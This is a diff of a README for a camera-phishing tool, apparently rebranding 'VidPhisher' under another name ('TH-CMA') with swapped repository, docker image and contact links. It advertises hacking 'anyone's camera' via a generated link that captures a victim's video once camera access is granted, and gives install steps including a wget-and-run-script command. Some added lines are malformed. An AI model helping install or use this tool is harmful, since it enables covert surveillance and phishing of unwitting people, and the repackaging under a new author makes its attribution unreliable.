@@ -1,6 +1,6 @@
 <h2 align="center"><u>VidPhisher</u></h2>
 
-![Hack anyone's camera and get videos](https://github.com/KasRoudra/VidPhisher/raw/main/files/banner.png)
+![Hack anyone's camera and get videos](https://i.postimg.cc/GtGrnPRP/1-y9-Tr-Wi-Jxx-Rj051-IJp46-Vw.png)
 
 <h4 align="center"> Hack anyone's camera and get videos!</h4>
 
@@ -21,48 +21,31 @@
 
 **VidPhisher is a phishing tool. It will generate a link. If anyone opens the link and permits camera access, his/her video will be captured and sent to you!**
 
-### [*]Announcement
 
-This project is now a part of [MaxPhisher](https://github.com/KasRoudra/MaxPhisher). Further bug fixes and feature addition will be available in that
+### [+] Installation On Termux
+```
 
+git clone https://github.com/TH-HACK/TH-CMA
 
-### [+] Installation
+cd TH-CMA
 
-- `git clone https://github.com/KasRoudra/VidPhisher`
-- `cd VidPhisher`
+termux-setup-storage
 
-For termux, use additional command `termux-setup-storage`
-
-- `bash vp.sh`
-
+bash TH-CMA.sh
+```
 ##### Or Run Directly
-
 ```
 wget https://raw.githubusercontent.com/KasRoudra/VidPhisher/main/vp.sh && bash vp.sh
 ```
 
-### Docker
-
- - `sudo docker pull kasroudra/vidphisher`
- - `sudo docker run --rm -it --name vidphisher kasroudra/vidphisher`
- - `sudo docker cp vidphisher:/VidPhisher vidfiles` [Run this on another terminal to copy received video/audio from docker to vidfiles folder keeping container open] 
-
-
-##### Usage
-
+### Installation On Kalli
 ```
-Usage: bash vp.sh [-h] [-o OPTION] [-p PORT] [-t TYPE] [-s DURATION] [-d DIRECTORY] [-u] [-nu]
-
-Options:
-  -h, --help                           Show this help message and exit
-  -o OPTION, --option OPTION           Index of the template
-  -p PORT, --port PORT                 Port of VidPhisher's Server (Default: 8080)
-  -t TYPE, --type TYPE                 Type of media (video or audio or screen, Default: video)
-  -T TUNNELER, --tunneler TUNNELER     Name of the tunneler for url shortening (Default: cloudflared)
-  -d DIRECTORY, --directory DIRECTORY  Directory where images will be saved
-  -s DURATION, --duration DURATION     Duration of media (Default: 5000(ms))
-  --update(-u), --no-update (-nu)      Check for update (Default: true)
+sudo docker pull TH-HACK/TH-CMA
+ sudo docker run --rm -it --name TH-CMA TH-HACK/TH-CMA`
+ sudo docker cp TH-CMA:/TH-CMA THfiles
 ```
+[Run this on another terminal to copy received video/audio from docker to vidfiles folder keeping container open] 
+p
 
 ### [+] Features
 
@@ -100,11 +83,11 @@ Thanks to <a href="https://github.com/Techchipnet/camphish">Techchip</a> and <a 
 
 ## [~] Find Me on :
 
-- [![Github](https://img.shields.io/badge/Github-KasRoudra-green?style=for-the-badge&logo=github)](https://github.com/KasRoudra)
+- [![Github](https://img.shields.io/badge/Github-KasRoudra-green?style=for-the-badge&logo=github)](https://github.com/TH-HACK)
 
-- [![Gmail](https://img.shields.io/badge/Gmail-KasRoudra-green?style=for-the-badge&logo=gmail)](mailto:kasroudrakrd@gmail.com)
+- [![Gmail](https://img.shields.io/badge/Gmail-KasRoudra-green?style=for-the-badge&logo=gmail)](mailto:frah7834@gmail.com)
 
-- [![Facebook](https://img.shields.io/badge/Facebook-KasRoudra-green?style=for-the-badge&logo=facebook)](https://facebook.com/KasRoudra)
+- [![Facebook](https://img.shields.io/badge/Facebook-KasRoudra-green?style=for-the-badge&logo=facebook)](https://facebook.com/12.00.00hh)
 
-- [![Messenger](https://img.shields.io/badge/Messenger-KasRoudra-green?style=for-the-badge&logo=messenger)](https://m.me/KasRoudra)
+- [![Messenger](https://img.shields.io/badge/Messenger-KasRoudra-green?style=for-the-badge&logo=messenger)](https://m.me/12.00.00hh)
 
